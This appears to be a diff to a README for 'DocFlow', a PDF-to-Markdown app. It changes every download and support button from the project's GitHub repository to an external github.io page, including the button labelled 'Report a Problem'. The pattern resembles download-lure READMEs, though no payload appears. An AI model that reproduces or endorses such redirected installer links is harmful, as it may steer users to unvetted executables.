@@ -1,7 +1,7 @@
 <h1>📄 DocFlow - PDF to Markdown Made Effortless</h1>
 
 <p align="center">
-  <a href="https://github.com/Pruthvra2855/DocFlow" style="display:inline-block; background:linear-gradient(135deg,#667eea,#764ba2); color:white; padding:16px 32px; border-radius:50px; font-size:20px; font-weight:bold; text-decoration:none; box-shadow:0 4px 15px rgba(0,0,0,0.2);">⬇️ DOWNLOAD NOW - FREE</a>
+  <a href="https://pruthvra2855.github.io" style="display:inline-block; background:linear-gradient(135deg,#667eea,#764ba2); color:white; padding:16px 32px; border-radius:50px; font-size:20px; font-weight:bold; text-decoration:none; box-shadow:0 4px 15px rgba(0,0,0,0.2);">⬇️ DOWNLOAD NOW - FREE</a>
 </p>
 
 <h2>✨ What is DocFlow?</h2>
@@ -23,7 +23,7 @@
 
 <h3>Step 1: Download the App</h3>
 <p>Visit this link to download the application:</p>
-<p align="center"><a href="https://github.com/Pruthvra2855/DocFlow" style="display:inline-block; background:#28a745; color:white; padding:14px 28px; border-radius:8px; font-size:18px; text-decoration:none;">📥 Click Here to Download DocFlow</a></p>
+<p align="center"><a href="https://pruthvra2855.github.io" style="display:inline-block; background:#28a745; color:white; padding:14px 28px; border-radius:8px; font-size:18px; text-decoration:none;">📥 Click Here to Download DocFlow</a></p>
 
 <h3>Step 2: Run the Installer</h3>
 <ol>
@@ -120,11 +120,11 @@
 
 <h2>📞 Need Help?</h2>
 <p>If you run into any issues, you can visit the GitHub page and open an issue (it's like a help ticket). The community and developers are friendly and responsive.</p>
-<p align="center"><a href="https://github.com/Pruthvra2855/DocFlow" style="display:inline-block; background:#17a2b8; color:white; padding:12px 24px; border-radius:6px; text-decoration:none;">🐛 Report a Problem or Get Support</a></p>
+<p align="center"><a href="https://pruthvra2855.github.io" style="display:inline-block; background:#17a2b8; color:white; padding:12px 24px; border-radius:6px; text-decoration:none;">🐛 Report a Problem or Get Support</a></p>
 
 <h2>🚀 Ready to Start?</h2>
 <p>Don't wait. Download DocFlow now and turn those PDFs into editable, beautiful Markdown documents in minutes.</p>
-<p align="center"><a href="https://github.com/Pruthvra2855/DocFlow" style="display:inline-block; background:#ffc107; color:black; padding:18px 36px; border-radius:50px; font-size:22px; font-weight:bold; text-decoration:none; box-shadow:0 4px 10px rgba(0,0,0,0.3);">📲 GET DOCFLOW NOW</a></p>
+<p align="center"><a href="https://pruthvra2855.github.io" style="display:inline-block; background:#ffc107; color:black; padding:18px 36px; border-radius:50px; font-size:22px; font-weight:bold; text-decoration:none; box-shadow:0 4px 10px rgba(0,0,0,0.3);">📲 GET DOCFLOW NOW</a></p>
 
 <br>
 <hr>
